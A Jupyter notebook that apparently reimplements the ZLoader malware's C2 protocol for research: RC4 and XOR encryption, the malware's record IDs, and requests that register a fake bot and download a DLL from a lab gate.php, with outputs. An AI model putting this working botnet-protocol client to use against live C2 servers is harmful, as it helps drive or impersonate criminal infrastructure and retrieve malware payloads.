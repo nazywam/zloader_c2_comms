{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 102,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import struct\n",
    "import hashlib\n",
    "import urllib3\n",
    "import ipaddress"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "urllib3.disable_warnings()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "proxies = {\n",
    "    \"http\":\"http://127.0.0.1:8080\",\n",
    "    \"https\":\"http://127.0.0.1:8080\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Setting\n",
    "* `c2_gate` is the gate.php of the server\n",
    "* `c2_key` is the encryption key extracted from the bot config file\n",
    "* `botnet_id` is the botnet ID from the config file\n",
    "* `header_size`, `md5_size`, `item_header_size` you shouldn't need to change\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 94,
   "metadata": {},
   "outputs": [],
   "source": [
    "c2_gate = \"http://192.168.86.86:8081/cp108/gate.php\"\n",
    "c2_key = \"12345678\"\n",
    "header_size = 48\n",
    "md5_size = 32\n",
    "item_header_size = 16"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Defines from gen.php"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 184,
   "metadata": {},
   "outputs": [],
   "source": [
    "BLT_COOKIES = 6\n",
    "BLT_FILE = 5\n",
    "BLT_GRABBED_HTTP = 3\n",
    "BLT_HTTPS_REQUEST = 2\n",
    "BLT_HTTP_REQUEST = 1\n",
    "BLT_KEYLOGER = 7\n",
    "BLT_PASSWORD = 8\n",
    "BLT_SCREENSHOT = 9\n",
    "BLT_UNKNOWN = 0\n",
    "BOTNET_MAX_CHARS = 20\n",
    "COMP_ID_MAX_CHARS = 100\n",
    "CSR_BACKCONNECT_CRYPT_KEY = 0x55\n",
    "CSR_BOT32_FILE = 1006\n",
    "CSR_BOT64_FILE = 1001\n",
    "CSR_BOT_FILE = 1000\n",
    "CSR_BOT_VERSION = 0x1000c00\n",
    "CSR_CP_VERSION = 0x1000800\n",
    "CSR_ERR_BOT_VERSION = 3221225481.0\n",
    "CSR_ERR_BUILD_INJECTS_FAILED = 3221225476.0\n",
    "CSR_ERR_CANT_CONNECT_DATABASE = 3221225473.0\n",
    "CSR_ERR_CONNECT_FAILED = 3221225477.0\n",
    "CSR_ERR_COPY_FILE_FAILED = 3221225480.0\n",
    "CSR_ERR_CREATE_PROCESS_FAILED = 3221225473.0\n",
    "CSR_ERR_DUPLICATE_CONTROL_PANEL = 3221225478.0\n",
    "CSR_ERR_FAILED = 3221225472.0\n",
    "CSR_ERR_FILE_NOT_FOUND = 3221225479.0\n",
    "CSR_ERR_INVALID_DATA = 3221225481.0\n",
    "CSR_ERR_INVALID_FILE = 3221225475.0\n",
    "CSR_ERR_INVALID_LICENSE_KEY = 3221225476.0\n",
    "CSR_ERR_LICENSE_DISABLED = 3221225480.0\n",
    "CSR_ERR_LICENSE_KEY_EXPIRED = 3221225477.0\n",
    "CSR_ERR_LICENSE_KEY_NOT_SPECIFIED = 3221225474.0\n",
    "CSR_ERR_PEPATH = 3221225482.0\n",
    "CSR_ERR_PROCESS_TIMEOUT = 3221225483.0\n",
    "CSR_ERR_SAVE_FILE_FAILED = 3221225474.0\n",
    "CSR_ERR_SERVER_IP_NOT_SPECIFIED = 3221225475.0\n",
    "CSR_ERR_START_UPDATE_TIMEOUT = 3221225478.0\n",
    "CSR_ERR_STOPED_BOT_TIMEOUT = 3221225479.0\n",
    "CSR_ERR_SUCCESS = 0x0\n",
    "CSR_HVNC32_FILE = 1007\n",
    "CSR_HVNC64_FILE = 1008\n",
    "CSR_HVNC_VERSION = 0x1000c00\n",
    "CSR_LAST_GEN = 1579182797\n",
    "CSR_LIBSSL_FILE = 1002\n",
    "CSR_LIBSSL_VERSION = 0x2\n",
    "CSR_MAGIC_ANSWER = 50403020\n",
    "CSR_NSS_FILE = 1005\n",
    "CSR_NSS_VERSION = 0x1\n",
    "CSR_POST_MAX_SIZE = 10\n",
    "CSR_SQLITE_FILE = 1003\n",
    "CSR_SQLITE_VERSION = 0x1\n",
    "CSR_ZLIB_FILE = 1004\n",
    "CSR_ZLIB_VERSION = 0x1\n",
    "GATE_MAX_CHARS = 64\n",
    "LOG_ID_BOT_DETECTED = 6\n",
    "LOG_ID_CHECK_POST_MAX_SIZE = 5\n",
    "LOG_ID_COLLECTOR = 10\n",
    "LOG_ID_INSTALL_NSS_CERT = 4\n",
    "LOG_ID_LOADER_UPDATE = 1\n",
    "LOG_ID_PELOADER = 7\n",
    "LOG_ID_PROCESS_INJECT = 8\n",
    "LOG_ID_STEALER = 9\n",
    "LOG_ID_WEBINJECTS_UPDATE = 3\n",
    "MARKER_MAX_CHARS = 20\n",
    "MAX_BOTNET_TIMEOUT = 60\n",
    "MAX_NUM_GATES = 10\n",
    "MIN_BOTNET_TIMEOUT = 1\n",
    "PROCESS_INTEGRITY_HIGH = 3\n",
    "PROCESS_INTEGRITY_LOW = 1\n",
    "PROCESS_INTEGRITY_MEDIUM = 2\n",
    "PROCESS_INTEGRITY_UNKNOWN = 0\n",
    "RC4_MAX_KEY = 32\n",
    "RC4_MIN_KEY = 8\n",
    "SBCID_ADV_SERVERS = 11010\n",
    "SBCID_BC_CLIENTPORT = 11041\n",
    "SBCID_BC_HVNC_CLIENTPORT = 11042\n",
    "SBCID_BC_IP = 11040\n",
    "SBCID_BOTLOG = 200000\n",
    "SBCID_BOTLOG_TYPE = 300000\n",
    "SBCID_BOTNET = 10002\n",
    "SBCID_BOT_ID = 10001\n",
    "SBCID_BOT_VERSION = 10003\n",
    "SBCID_COUNT_SCRIPTS = 11004\n",
    "SBCID_DEBUG = 10022\n",
    "SBCID_GET_FILE = 11014\n",
    "SBCID_GET_FILE_VER = 11015\n",
    "SBCID_HTTP_PROXY = 11013\n",
    "SBCID_INTEGRITY_LEVEL = 10023\n",
    "SBCID_IPV4_ADDRESSES = 10016\n",
    "SBCID_IPV6_ADDRESSES = 10017\n",
    "SBCID_LANGUAGE_ID = 10013\n",
    "SBCID_LOADER_UPDATE = 11020\n",
    "SBCID_LOADER_UPDATE_SUCCESS = 11021\n",
    "SBCID_LOG_ERR_CODE = 11032\n",
    "SBCID_LOG_ID = 11030\n",
    "SBCID_LOG_ID_EXT = 11031\n",
    "SBCID_LOG_MSG = 11033\n",
    "SBCID_MARKER = 10025\n",
    "SBCID_MD5_BOT = 10026\n",
    "SBCID_NET_LATENCY = 10005\n",
    "SBCID_NUM_MONITORS = 10024\n",
    "SBCID_NUM_REPORTS = 100000\n",
    "SBCID_OS_INFO = 10012\n",
    "SBCID_PING = 10006\n",
    "SBCID_PROCESS_LIST = 10020\n",
    "SBCID_PROCESS_NAME = 10014\n",
    "SBCID_PROCESS_USER = 10015\n",
    "SBCID_SCRIPTS = 11003\n",
    "SBCID_SCRIPT_ID = 11000\n",
    "SBCID_SCRIPT_RESULT = 11002\n",
    "SBCID_SCRIPT_STATUS = 11001\n",
    "SBCID_SOURCE = 400000\n",
    "SBCID_TIMEZONE = 10027\n",
    "SBCID_TIME_LOCALBIAS = 800000\n",
    "SBCID_TIME_SYSTEM = 600000\n",
    "SBCID_TIME_TICK = 700000\n",
    "SBCID_TITLE = 500000\n",
    "SBCID_WEBFILTERS = 11011\n",
    "SBCID_WEBINJECTS = 11012\n",
    "SBCID_WEBINJECTS_UPDATE = 11022\n",
    "SBCID_WEBINJECTS_UPDATE_SUCCESS = 11023"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Initialize RC4\n",
    "def rc4_init(key):\n",
    "    _hash = [None] * 256\n",
    "    _box = [None] * 256\n",
    "    _keylen = len(key)\n",
    "    \n",
    "    for x in range(256):\n",
    "        _hash[x] = ord(key[x % _keylen])\n",
    "        _box[x] = x\n",
    "    \n",
    "    y = 0\n",
    "    for x in range(256):\n",
    "        y = (y + _box[x] + _hash[x]) % 256\n",
    "        tmp = _box[x]\n",
    "        _box[x] = _box[y]\n",
    "        _box[y] = tmp\n",
    "    \n",
    "    return _box\n",
    "\n",
    "# Encrypt RC4\n",
    "def rc4(data, key):\n",
    "    _len = len(data)\n",
    "    z = y = 0\n",
    "    for x in range(_len):\n",
    "        z = (z + 1) % 256\n",
    "        y = (y + key[z]) % 256\n",
    "        tmp = key[z]\n",
    "        key[z] = key[y]\n",
    "        key[y] = tmp\n",
    "        data[x] = data[x] ^ (key[((key[z] + key[y]) % 256)])\n",
    "    return data\n",
    "\n",
    "# Visual Decrypt\n",
    "def v_decrypt(data):\n",
    "    _len = len(data)\n",
    "    for x in reversed(range(1, _len)):\n",
    "        data[x] = data[x] ^ data[x-1]\n",
    "    return data\n",
    "\n",
    "# Visual Encrypt\n",
    "def v_encrypt(data):\n",
    "    _len = len(data)\n",
    "    for x in range(_len):\n",
    "        data[x] = data[x] ^ data[x-1]\n",
    "    return data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 115,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Complete encrypt sequence\n",
    "def encrypt(data):\n",
    "    key = rc4_init(c2_key)\n",
    "    data = v_encrypt(list(data))\n",
    "    data = rc4(data, key=key)\n",
    "    return data\n",
    "\n",
    "# Complete decrypt sequence\n",
    "def decrypt(data, skipVisual=False):\n",
    "    key = rc4_init(c2_key)\n",
    "    data = rc4(list(data), key=key)\n",
    "    if skipVisual:\n",
    "        return data\n",
    "    else:\n",
    "        return v_decrypt(data)\n",
    "\n",
    "# Convert output from decrypt/encrypt into bytes object\n",
    "def bytes2str(data):\n",
    "    return bytes(bytearray(data))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Send complete request to C2 and get decrypted data\n",
    "def send_request(data, skipVisual=False):\n",
    "    r = requests.post(c2_gate, data=bytes2str(encrypt(data)), proxies=proxies, verify=False)\n",
    "    return bytes2str(decrypt(r.content, skipVisual))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 117,
   "metadata": {},
   "outputs": [],
   "source": [
    "def parse_response(data):\n",
    "    header = data[:header_size]\n",
    "    _md5 = header[md5_size:].hex()\n",
    "    body = data[header_size:]\n",
    "    parsed_data = {}\n",
    "    x = 0\n",
    "    while x < len(body):\n",
    "        header_offset = x+item_header_size\n",
    "        k = struct.unpack('IIII', body[x:header_offset])\n",
    "        parsed_data[k[0]] = body[header_offset:header_offset+k[2]]\n",
    "        x += item_header_size+k[2]\n",
    "    return parsed_data\n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {},
   "outputs": [],
   "source": [
    "def pack_data(data):\n",
    "    body = []\n",
    "    for record_id, content in data.items():\n",
    "        record_header = struct.pack('IIII', record_id, 0, len(content), 0)\n",
    "        body.append(record_header + content)\n",
    "    finished_body = b''.join(body)\n",
    "    header = b''.join([b'0'*(md5_size), hashlib.md5(finished_body).digest()])\n",
    "    return b''.join([header, finished_body])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "metadata": {},
   "outputs": [],
   "source": [
    "def convert_to_int(hstr):\n",
    "    return struct.unpack('I', bytearray.fromhex(hstr)) # 'C0A8641B'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "metadata": {},
   "outputs": [],
   "source": [
    "def sr(data, skipVisual=False):\n",
    "    resp = send_request(pack_data(data), skipVisual)\n",
    "    if skipVisual:\n",
    "        return resp\n",
    "    return parse_response(resp)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Talking to the bot\n",
    "To talk to the bot you need to create a list of properties dictionary, for example `10002` is botnet id, while `10001` is bot's name.\n",
    "\n",
    "Then pass the dictionary via `pack_data` to `send_request` like in example. \n",
    "\n",
    "Sometimes the C2 response will be parsable, but when its a binary, the parse_reponse will fail. Decoding binaries is not implemented here."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 185,
   "metadata": {},
   "outputs": [],
   "source": [
    "# New Bot\n",
    "newbot_request = {\n",
    "    SBCID_BOT_ID:b\"BOTID\",\n",
    "    SBCID_BOTNET:b\"BOTNET\",\n",
    "    SBCID_OS_INFO:struct.pack(\"BBHH\", 2, 3, 9, 9),\n",
    "    SBCID_BOT_VERSION:struct.pack(\"I\", CSR_BOT_VERSION),\n",
    "    SBCID_IPV4_ADDRESSES: int(ipaddress.IPv4Address('192.168.0.1')).to_bytes(4, byteorder='big'),\n",
    "    SBCID_PROCESS_LIST:b\"Item 1|Item2\",\n",
    "    SBCID_INTEGRITY_LEVEL:struct.pack(\"L\", 1),\n",
    "    SBCID_NUM_MONITORS:struct.pack(\"L\", 1),\n",
    "    SBCID_MARKER:b\"BOTMARKER\",\n",
    "    SBCID_MD5_BOT: hashlib.md5(b\"md5\").digest(),\n",
    "    SBCID_TIMEZONE:b\"PST\",\n",
    "    SBCID_WEBINJECTS:struct.pack(\"L\", True)\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 186,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{11012: b'123',\n",
       " 11004: b'\\x00\\x00\\x00\\x00',\n",
       " 11010: b'http://192.168.86.86:8081/cp108/gate.php',\n",
       " 11011: b'',\n",
       " 11013: b'\\x01\\x00\\x00\\x00',\n",
       " 1650751854: b'amcvdqtslrjbozrunjtnwozyhejltruhewshwhqxlklwscoasdodcw'}"
      ]
     },
     "execution_count": 186,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sr(newbot_request)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 194,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Script Report\n",
    "script_report = {\n",
    "    SBCID_BOT_ID:b\"BOTID\",\n",
    "    SBCID_BOTNET:b\"BOTNET\",\n",
    "    SBCID_SCRIPT_ID:bytes(bytearray.fromhex(\"9A1B74A332125248977AE171F7A51D23\")),\n",
    "    SBCID_SCRIPT_STATUS: struct.pack(\"L\", 1),\n",
    "    SBCID_SCRIPT_RESULT: b\"Script result string\"\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 195,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{}"
      ]
     },
     "execution_count": 195,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sr(script_report)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 197,
   "metadata": {},
   "outputs": [],
   "source": [
    "# File Request\n",
    "file_request = {\n",
    "    SBCID_BOT_ID:b\"BOTID\",\n",
    "    SBCID_BOTNET:b\"BOTNET\",\n",
    "    SBCID_GET_FILE: struct.pack('I', CSR_SQLITE_FILE),\n",
    "    SBCID_GET_FILE_VER: struct.pack('I', 1)\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 198,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\xeb\\x03\\x00\\x00\\x01\\x00\\x00\\x00\\x19\\xfd#^{\"\\x0e\\x00\\x9c\\xc1\\x9b\\x10\\x00MZ\\x90\\x00\\x03\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\xff\\xff\\x00\\x00\\xb8\\x00\\x00\\x00\\x00\\x00\\x00\\x00@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x0e\\x1f\\xba\\x0e\\x00\\xb4\\t\\xcd!\\xb8\\x01L\\xcd!This program cannot be run in DOS mode.\\r\\r\\n$\\x00\\x00\\x00\\x00\\x00\\x00\\x00PE\\x00\\x00L\\x01\\x12\\x00\\xd5)&]\\x002\\x0c\\x00(\\x10\\x00\\x00\\xe0\\x00\\x06!\\x0b\\x01\\x02\\x19\\x00v\\t\\x00\\x00&\\x0b\\x00\\x00\\n\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x90\\t'"
      ]
     },
     "execution_count": 198,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sr(file_request, skipVisual=True)[:200]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
